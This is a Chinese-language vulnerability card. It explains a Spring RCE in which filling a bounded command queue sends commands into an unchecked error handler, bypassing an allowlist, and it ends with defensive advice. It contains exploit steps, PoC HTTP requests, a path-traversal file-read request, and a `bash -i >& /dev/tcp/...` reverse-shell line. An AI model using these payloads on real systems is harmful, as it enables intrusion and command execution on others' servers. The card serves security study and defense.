---
id: web-java-rce-command-queue-full-exception-allowlist-bypass
title: Java 命令队列满触发异常兜底：ArrayBlockingQueue.add 抛错进入无校验 handleError，绕过命令白名单 RCE
type: scenario
domain: web
path: web/java/rce
technique: command-queue-full-exception-fallback-allowlist-bypass
aliases:
- 队列满绕过命令白名单
- ArrayBlockingQueue 命令执行
- 并发打满队列
- handleError 兜底绕过
- 异常路径命令执行
tags:
- java
- spring
- rce
- command-execution
- queue
- race-condition
- allowlist-bypass
- logic-flaw
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V227
  verified_at: '2026-11-07T06:43:21+08:00'
  notes: 已对照原文 ezjava/safemail 代码与 img04-08 核对：ArrayBlockingQueue 容量 100、newFixedThreadPool(2)、processCommand 白名单 ALLOWED_REGEX 仅 ping IP/hostname/whoami、runTool 的 catch 直接 handleError(command) 且 handleError 只补 ping -c 2 后 SystemUtil.runCmd、Burp 资源池 120 并发打满后提交 calc、控制台队列计数 100 与计算器截图、getImg 仅拦截含 plugin 的路径可任意文件读取均一致；admin/admin 登录前提与原文一致。未验证点：未搭环境复跑并发竞争。与 18834 ELProcessor 白名单卡等为 related，链路不同，非重复。
---

## 一句话结论

Spring 应用的 `/runTool` 把用户提交的命令放进容量 100 的 `ArrayBlockingQueue`，由 2 个线程按白名单（仅 `ping IP`/`hostname`/`whoami`）消费；但 `add()` 在队列满时抛 `IllegalStateException`，catch 分支调用 `handleError()` 直接执行命令且不做任何白名单校验。攻击者用约 120 个并发请求打满队列，让随批提交的 `calc`/`sh -c ...` 命中异常兜底路径，即可执行任意系统命令。

## 原理

- **正常路径有白名单**：`processCommand()` 先调用 `isSafeCommand(command)`（实现为 `!Pattern.matches(ALLOWED_REGEX, command)`），不匹配允许正则的命令被打印 “Blocked” 后丢弃；`ALLOWED_REGEX` 是 `^(ping\s+<IP>|hostname|whoami)$` 的全串匹配，参数注入也被堵住。
- **异常路径无校验**：`runCommand()` 的 `catch (Exception e) { handleError(command); }` 是另一条执行路径；`handleError()` 只对 `ping` 追加 `-c 2`，然后直接 `SystemUtil.runCmd(command)`，没有调用 `isSafeCommand`。这是“校验逻辑重复实现但漏在错误处理分支”的典型缺陷。
- **如何进入 catch**：`ArrayBlockingQueue.add()` 在队列满时抛 `IllegalStateException("Queue full")`，而不是阻塞或返回 false。队列容量 100、消费者只有 2 个线程，攻击者并发提交 100 个以上请求即可在某一瞬间填满队列；此时再有 `add()` 就进入 catch。
- **为什么需要并发**：队列满是一个瞬时状态；必须让请求在同一时间窗口内到达，使恶意命令恰好落在 `add()` 抛错的那一次。原文用 Burp Intruder 设置 120 并发（资源池 120），批量发送 `ping 127.0.0.1` 填队列，并混入 `calc` 请求。
- **无回显的处理**：命令执行结果不返回给 HTTP 响应；原文把结果写入文件，再用同应用的 `/admin/category/getImg?path=...` 读取（该接口只检查路径里是否含 `plugin` 子串，可用绝对路径/`../` 读取任意文件），也可改用反弹 shell 或 DNS/HTTP 外带。
- **根因**：用异常作为控制流、错误处理分支复用执行函数却不复用校验；命令白名单只覆盖主路径。

## 触发条件

- Web 接口接收用户可控的命令字符串并放入有界队列，队列满时 `add()` 抛异常。
- 消费线程数量有限、单条命令执行较慢，攻击者可用并发把队列打满。
- catch/兜底分支直接执行命令，未复用白名单校验。
- 攻击者能并发发送请求；原文环境需要先登录（admin/admin）才能访问 `/runTool`。
- 命令无回显时，需要文件写入 + 任意文件读取、反弹 shell 或 OOB 通道。

## 利用步骤

1. 登录应用（原文 admin/admin），确认 `/runTool` 接收 JSON `{"command":"..."}`。
2. 从源码/报错确认队列容量（100）与消费者数量（2），判断需要的并发量。
3. 用 Burp Intruder/并发脚本同时发送 100+ 个 `{"command":"ping 127.0.0.1"}` 请求填满队列。
4. 在同一批次中发送恶意命令，如 `{"command":"calc"}` 或 `{"command":"cmd /c whoami > C:\\temp\\1"}`；命中 `add()` 抛错的那次即进入 `handleError()` 执行。
5. 若无回显，把输出写入 Web 可读路径或临时文件，再用 `/admin/category/getImg?path=../../../../../../../../tmp/1` 读取；文件读取接口只拦截路径中的 `plugin` 子串。
6. 也可用 `bash -c 'bash -i >& /dev/tcp/...'` 等反弹 shell 获取交互式回显。

## PoC

正常请求与恶意请求同批并发（原文截图）：

```http
POST /runTool HTTP/1.1
Host: 127.0.0.1:58023
Content-Type: application/json
Cookie: JSESSIONID=<admin session>

{"command":"calc"}
```

Burp Intruder 配置：攻击类型 Sniper/单 payload，资源池最大并发请求数 120，payload 为 `ping 127.0.0.1`；同一时间窗口内提交 `calc` 请求。原文截图显示队列计数达到 100 后控制台输出“触发命令执行”，并弹出计算器。

读取命令输出（文件写入后）：

```http
GET /admin/category/getImg?path=../../../../../../../../tmp/1 HTTP/1.1
```

## 变体与关联

- 队列/池变体：`ArrayBlockingQueue`、`LinkedBlockingQueue`（有界）、线程池任务队列、信号量；凡是“满/拒绝时走另一条执行路径”的结构都可尝试。
- 触发变体：慢命令占满消费者、批量并发、队列容量边界、消费者线程被阻塞。
- 兜底变体：catch 中调用 `handleError`/`fallback`/`retry`；错误处理分支往往缺少主路径的鉴权/白名单。
- 回显变体：文件写入 + 任意文件读取、反弹 shell、DNS/HTTP 外带、延时盲判。
- 关联卡片：[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]、[[web-java-rce-spring-actionnetworkcmd-ip-time-sh-c]]、[[web-java-expression-justel-plugin-hotload-config-path-traversal]]（同文章另一条 RCE 链）。
- 边界：本案依赖并发竞争，队列容量/消费者速度/网络时序决定成功率；不同实现可能用 `offer()`/`put()`，需要按实际语义调整。

## 检测与防御

- **统一执行入口**：所有命令执行必须经过同一个 `execute(command)` 函数，内嵌白名单校验；`handleError()` 不得直接调用 `SystemUtil.runCmd`。
- **失败关闭**：队列满时拒绝并记录，不要执行；`add()` 改为 `offer()` 并显式处理 false，或使用 `put()` 阻塞。
- **白名单加固**：使用参数数组而非 shell 字符串，按命令名 + 参数格式校验，禁止 `sh -c`/`cmd /c` 拼接。
- **监控**：对队列长度突增、同一会话高频并发、`/runTool` 短时间大量请求告警；记录被拒绝与异常分支的命令。
- **最小权限**：运行命令的进程使用低权限账号，禁止访问敏感目录；文件读取接口做规范化与根目录限制。
